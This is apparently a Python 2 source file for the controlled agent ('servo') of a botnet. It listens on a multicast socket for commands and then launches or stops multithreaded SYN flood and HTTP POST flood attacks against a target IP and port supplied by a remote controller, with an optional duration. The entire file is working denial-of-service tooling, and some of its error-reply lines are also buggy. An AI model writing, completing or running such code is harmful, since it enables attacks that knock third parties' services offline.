import sys
import threading
import socket
import time
import Queue
from multicastreceiver import *
from httppost import *
from synflood import *

aPrint = ["SYN Flood", "HTTP Flood"]

def initRcvThread():
    sock = configMulticastSock()

    eAlive = threading.Event()
    eMsg = threading.Event()
    eRead = threading.Event()

    eAlive.set()
    eMsg.clear()
    eRead.clear()

    t = threading.Thread(target = rcvMsg, args = (sock, eAlive, eMsg, eRead))
    t.setDaemon(True)
    t.start()
    return (sock, t, eAlive, eMsg, eRead) 

def initAttack():
    aEvents = [threading.Event(), threading.Event()]
    aTimes = [-1, -1]
    aTimesStart = [time.time(), time.time()]
    aQueues = [Queue.Queue(0), Queue.Queue(0)]

    return (aEvents, aTimes, aTimesStart, aQueues)

def startAttack(n, port, ip, event, aType, time):
    threads = aType
    if (aType == 0):
        threads = n

    event.set()
    queue = Queue.Queue(threads)
    for i in range(1, int(threads)+1):
        if (aType == 0):
            t = threading.Thread(target = synFlood, args = (i, port, ip, event,
                                                            queue))
        else:
            t = threading.Thread(target = httpPost, args = (0, port, ip, event,
                                                            queue, n))
        t.setDaemon(True)
        t.start()
        queue.put(i)

    reply = "%s attack started with %s attach units" % (aPrint[aType], n)

    if (time > 0):
        reply += " and will last for %s seconds" % (time)

    setReply(reply)
    return queue

def stopAttack(event, queue, aType):
    event.clear()
    queue.join()
    reply = "%s attack stoped" % (aPrint[aType])
    setReply(reply)

def checkTime(aEvents, aTimes, aTimesStart, aQueues):
    for i in range(0, 1):
        if (aTimes[i] > 0) & ((time.time() - aTimesStart[i]) > aTimes[i]):
            print "[SERVO] Finishing %s (lasted for %s seconds)...\n" %\
                  (aPrint[i], aTimes[i])
            stopAttack(aEvents[i], aQueues[i], i)
            aTimes[i] = -1

################################### INICIO ##################################### 
if __name__ == '__main__':
    print "[SERVO] Servo main thread started\n"

    (sock, rcvThread, eAlive, eMsg, eRead) = initRcvThread()
    (aEvents, aTimes, aTimesStart, aQueues) = initAttack()

    while 1:
        checkTime(aEvents, aTimes, aTimesStart, aQueues)
        if not eMsg.is_set():
            continue

        body = getBody()
        words = body.split(';')

        aType = 0
        if words[0] == 'http-post':
            aType = 1

        if words[1] == 'start':
            try:
                print "[SERVO] Start requested for %s. Starting threads...\n" %\
                      (aPrint[aType])
                if (aEvents[aType].is_set()):
                    setReply("%s Attack already started") % (aPrint[aType])
                    
                if (len(words) > 5):
                    t = aTimes[aType] = int(words[5])
                    aTimesStart[aType] = time.time()
                    aQueues[aType] = startAttack(words[2], words[3], words[4],
                                                 aEvents[aType], aType, t)
                else:
                    aQueues[aType] = startAttack(words[2], words[3], words[4],
                                                 aEvents[aType], aType, -1)
            except:
                setReply("Failed to initialize %s attack threads") %\
                        (aPrint[aType])
        else:
            if (aEvents[aType].is_set()):
                print "[SERVO] Stop requested for %s. Stopping threads...\n" %\
                      (aPrint[aType])
                stopAttack(aEvents[aType], aQueues[aType], aType)
            else:
                setReply("%s Attack already stoped" % (aPrint[aType]))

        
        eRead.set()
        eMsg.clear()

    sock.close()

